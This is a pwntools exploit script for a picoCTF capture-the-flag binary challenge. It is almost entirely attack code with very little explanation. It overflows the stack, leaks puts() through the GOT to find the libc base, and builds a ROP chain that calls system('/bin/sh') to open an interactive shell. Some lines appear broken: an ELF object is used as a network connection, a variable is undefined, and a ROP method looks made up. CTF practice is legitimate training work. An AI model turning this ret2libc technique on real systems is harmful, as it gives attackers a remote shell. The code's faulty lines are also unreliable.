# First, generate template using:
# pwn template --host mercury.picoctf.net --port 24159 ./vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'
from pwn import *


if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./provided_libc.so.6")

banner = "WeLcOmE To mY EcHo sErVeR!\n"
io = ELF("./vuln_patched")

#io = start()


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    proc.sendlineafter(banner, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset


overflow_offset = get_overflow_offset()

log.info("puts() address in GOT: {}".format(hex(exe.got['puts'])))

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # Leak address of puts() via puts()
rop.do_stuff()

log.info("First ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))

io.sendlineafter(banner, payload)
io.recvline()

puts_addr = int.from_bytes(io.recvline(keepends = False), byteorder = "little")
log.info("puts() runtime address: {}".format(hex(puts_addr)))

libc_base = puts_addr - libc.symbols["puts"]
assert(libc_base & 0xFFF == 0)
log.info("LibC runtime base address: {}".format(hex(libc_base)))

libc.address = libc_base

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # dummy call, align stack for XMM
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
log.info("Second ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))

io.sendline(payload)
io.recvline()
io.recvline()

io.interactive()

